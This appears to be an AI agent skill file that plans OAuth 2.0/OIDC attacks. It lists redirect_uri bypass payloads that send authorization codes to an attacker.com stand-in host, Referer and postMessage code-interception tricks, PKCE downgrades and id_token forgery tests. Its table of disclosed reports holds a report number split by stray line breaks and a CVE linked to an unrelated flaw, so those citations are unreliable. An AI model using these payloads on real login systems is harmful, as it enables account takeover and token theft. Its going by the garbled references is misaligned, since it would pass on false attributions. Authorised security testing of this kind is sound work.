---
name: hunt-oauth
description: OAuth 2.0 / OIDC attack — redirect_uri, state, code interception, implicit misuse, token leakage.
keywords: [oauth, oidc, openid, authorization code, redirect_uri, state, pkce, implicit flow, sso, social login]
---

# hunt-oauth

## When this skill loads

Triggers: "oauth", "openid connect", "sso", "login with google",
"login with apple", "authorization_code", "redirect_uri", "PKCE",
"state parameter", "social login".

## 5-phase OAuth attack plan

### Phase 1 — `redirect_uri` validation

Find the authorize endpoint (look for `response_type=code` in
network traffic). Then probe `redirect_uri`:

| Allow rule (suspected) | Test payload |
|---|---|
| Exact match | `https://app.example.com/cb` → baseline; vary case `/CB`, trailing `/`, append `?x=1`, `#x` |
| Suffix `app.example.com` | `https://attacker.app.example.com/`, `https://app.example.com.attacker.com/`, `https://app.example.com@attacker.com/` |
| Subdomain wildcard `*.example.com` | look for subdomain takeover (`hunt-dns`) on the same apex |
| Path prefix `/callback` | `https://app.example.com/callback/../?`, `https://app.example.com/callback%2f@attacker.com`, `https://app.example.com/callback#@attacker.com/` |
| Parameter parser quirks | `https://app.example.com/cb?x=https://attacker.com` (some apps reflect uri params) |
| Open redirect on app | `https://app.example.com/redirect?to=https://attacker.com` |

Specific dangerous patterns (disclosed):

```
?redirect_uri=https://app.example.com/cb#@attacker.com/
?redirect_uri=https://app.example.com/cb%23@attacker.com/
?redirect_uri=https://attacker.com\@app.example.com/cb
?redirect_uri=https://app.example.com/cb/../../redirect/to/attacker.com
```

### Phase 2 — `state` CSRF

Test:

1. Omit `state` entirely — does the server accept and create a session?
   That's CSRF on the linking flow (attacker links victim's account
   to attacker's social identity).
2. Reuse a captured `state` — should fail; if accepted, replay
   attack.
3. `state` not bound to session — capture from one session, complete
   with another.

### Phase 3 — authorization code interception

Channels that leak the code:

| Channel | Test |
|---|---|
| `Referer` header | Use `redirect_uri` pointing to an attacker-page that includes an `<img src=//attacker>` — the referer carries the code-bearing URL |
| `postMessage` | If app posts the code via window.postMessage with `*` target, listen from attacker iframe |
| Browser history | code in URL fragment + bfcache — multi-tab attack |
| Open redirect chain | redirect_uri to attacker via legitimate redirector |
| `code` reuse | use the same code twice; AS must reject — if not, replay |
| `code` lifetime | wait 10 min, try again. RFC 6749 mandates ≤10 min |

### Phase 4 — implicit / response_type abuse

```
?response_type=token              (legacy implicit — token in fragment, leaks via referer)
?response_type=token id_token     (hybrid — id_token forgery checks)
?response_type=code token         (hybrid — same)
?response_type=none               (some IdPs leak via 302 anyway)
```

If app supports both `code` and `token` and you can force `token`
on a flow originally designed for `code`, you bypass PKCE.

### Phase 5 — PKCE bypass / id_token forgery

| Test | Indicator |
|---|---|
| Omit `code_verifier` on token exchange | AS rejects → good. Accepts → PKCE optional → bypassable |
| Use `code_challenge_method=plain` then send verifier as the challenge | accepted = downgrade |
| `id_token` with `alg=none` | (see `hunt-jwt`) |
| `id_token` signed with HS256 using `client_secret` known to attacker | confused-deputy attack |
| `aud` claim accepted across multiple clients | cross-app token replay |

## Specific provider quirks

| Provider | Quirk |
|---|---|
| Google | Domain-restricted (`hd=example.com`) — verify enforcement; bypass via secondary domain |
| Apple | "Hide my email" relays — verify email-binding |
| Facebook | `scope=email` doesn't guarantee `email_verified=true` |
| Microsoft | `tid=common` allows any tenant; check tenant pinning |
| Okta | `prompt=none` — IdP-initiated SSO can be CSRF'd |
| Auth0 | `connection` param can swap IdP; some apps forget to validate |

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #244

8e (Slack) | OAuth `redirect_uri` matched suffix → `slack.com.attacker` |
| H1 #131202 (Uber) | Cookie-bomb + state CSRF → account linking takeover |
| H1 #665651 (Shopify) | `redirect_uri=...#@attacker.com/` fragment confusion |
| H1 #1037436 (HackerOne) | `prompt=none` + Okta IdP-init → cross-tenant ATO |
| H1 #1132182 (PayPal) | Missing audience check → token replay across PayPal apps |
| CVE-2023-32700 (LuaTeX) | Token leakage via referer in PDF render |
| Microsoft "nOAuth" (2023) | `email` claim trusted without `email_verified` |

## Never-submit fallbacks

- "OAuth flow uses `state`" without showing it's *unbound* → KILL
- Missing PKCE on a *server-side* confidential client → KILL
  (PKCE is for public clients; mandatory only since OAuth 2.1)
- `response_type=token` allowed but redirect_uri is properly bound
  to the public client → KILL

## See also

- `hunt-jwt` — id_token / access_token tampering
- `hunt-redirect` — open redirect feeding redirect_uri bypass
- `hunt-saml` — for SAML SSO (different RFC, similar mental model)
- `okta-attack`, `m365-entra-attack` — provider-specific quirks
